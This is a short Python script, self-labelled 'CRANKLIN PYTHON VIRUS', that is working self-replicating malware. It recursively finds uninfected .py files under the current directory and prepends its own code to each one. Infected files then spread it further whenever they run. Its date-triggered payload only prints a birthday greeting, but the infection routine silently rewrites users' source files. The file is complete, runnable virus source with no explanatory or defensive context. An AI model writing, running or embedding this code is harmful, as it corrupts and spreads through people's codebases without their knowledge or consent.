#!/usr/bin/python
import os
import time


SIGNATURE = "CRANKLIN PYTHON VIRUS"


def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        fpath = os.path.join(path, fname)
        if os.path.isdir(fpath):
            filestoinfect.extend(search(fpath))
        elif fname.endswith(".py"):
            infected = False
            for line in open(fpath):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(fpath)
    return filestoinfect


def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for line in virus:
        virusstring += line
        if line.strip() == "bomb()":
            break
    virus.close()
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname, "w")
        f.write(virusstring + temp)
        f.close()
        
        
def bomb():
    if time.strftime("%m %d") == "01 25":
        print("HAPPY BIRTHDAY CRANKLIN!")


filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
bomb()
